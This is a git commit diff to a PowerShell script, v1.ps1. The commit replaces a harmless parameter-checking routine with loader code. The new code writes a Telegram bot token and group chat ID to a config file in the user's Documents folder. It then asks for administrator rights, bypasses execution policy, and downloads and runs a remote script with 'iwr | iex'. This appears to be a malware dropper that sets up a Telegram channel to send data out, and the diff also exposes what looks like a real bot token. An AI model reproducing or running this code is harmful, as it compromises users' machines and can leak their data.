c6b1052198b084f12a7ee37c8632686d21d3e490
uzigirl <uzumakitango@gmail.com>
2024-12-09 07:25:13 +0100

    Update v1.ps1

--- afiboy/v1.ps1
+++ afiboy/v1.ps1
@@ -1,17 +1,22 @@
-param (
-    [string]$paramValue  # Define the parameter to accept input
-)
 
-# Check if the parameter was received
-if ([string]::IsNullOrWhiteSpace($paramValue)) {
-    Write-Host "Error: No parameter received!"
-} else {
-    Write-Host "Parameter received from parent script: $paramValue"
-
-    # Example condition
-    If ($paramValue -eq "nextValue") {
-        Write-Host "Parameter matches the expected value."
-    } else {
-        Write-Host "Parameter does not match. Received: $paramValue"
-    }
+$scriptUrl = "https://raw.githubusercontent.com/uzigirl/std/main/meu/og.ps1" 
+$documentsPath = [Environment]::GetFolderPath("MyDocuments")
+$configFilePath = Join-Path -Path $documentsPath -ChildPath "config.txt"
+$configContent = @"
+BOT_TOKEN=7922611040:AAEU1YqPYGjfN0SwaHvxD5ADZVFjGdGu29o
+GROUP_CHAT_ID=-4620571711
+"@
+Try {
+    $configContent | Set-Content -Path $configFilePath -Force
+    Write-Host "Configuration file created successfully at: $configFilePath"
+} Catch {
+    Write-Error "Failed to create the configuration file: $_"
 }
+
+If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    # Restart the script with admin rights for tasks that require elevation
+    Start-Process powershell.exe -ArgumentList "-NoExit -ExecutionPolicy Bypass -Command `"& { iwr -Uri '$scriptUrl' -UseBasicParsing | iex }`"" -Verb RunAs
+    Exit
+}
+
+Write-Host "Running as Administrator... Perform admin-required tasks here."
